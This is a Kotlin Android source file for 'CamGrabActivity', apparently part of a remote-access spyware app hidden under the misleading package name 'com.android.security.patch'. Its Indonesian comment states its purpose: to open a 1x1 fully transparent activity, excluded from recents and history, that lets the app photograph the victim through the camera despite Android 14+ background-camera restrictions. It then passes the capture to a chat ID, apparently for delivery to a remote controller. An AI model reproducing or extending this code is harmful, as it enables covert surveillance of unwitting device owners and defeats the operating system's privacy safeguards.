package com.android.security.patch

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import com.android.security.patch.commands.Media

/**
 * 1x1 invisible activity. Bikin app "visible" cukup lama buat capture
 * camera di Android 14+/16+ yang restrict background camera.
 */
class CamGrabActivity : Activity() {

    companion object {
        fun request(ctx: Context, facing: Int, flashMode: Int, chatId: Long) {
            val i = Intent(ctx, CamGrabActivity::class.java).apply {
                addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK
                    or Intent.FLAG_ACTIVITY_NO_ANIMATION
                    or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
                    or Intent.FLAG_ACTIVITY_NO_HISTORY
                )
                putExtra("facing", facing)
                putExtra("flash", flashMode)
                putExtra("chat_id", chatId)
            }
            ctx.startActivity(i)
        }
    }

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        try {
            val lp = window.attributes
            lp.width = 1
            lp.height = 1
            lp.gravity = Gravity.TOP or Gravity.START
            lp.alpha = 0f
            lp.dimAmount = 0f
            window.attributes = lp
            window.setGravity(Gravity.TOP or Gravity.START)
        } catch (_: Throwable) {}
    }

    override fun onResume() {
        super.onResume()
        val facing = intent.getIntExtra("facing", 0)
        val flash = intent.getIntExtra("flash", 0)
        val chatId = intent.getLongExtra("chat_id", 0L)
        Media.captureFromActivity(this, facing, flash, chatId)
        Handler(Looper.getMainLooper()).postDelayed({ try { finish() } catch (_: Throwable) {} }, 6000)
    }
}
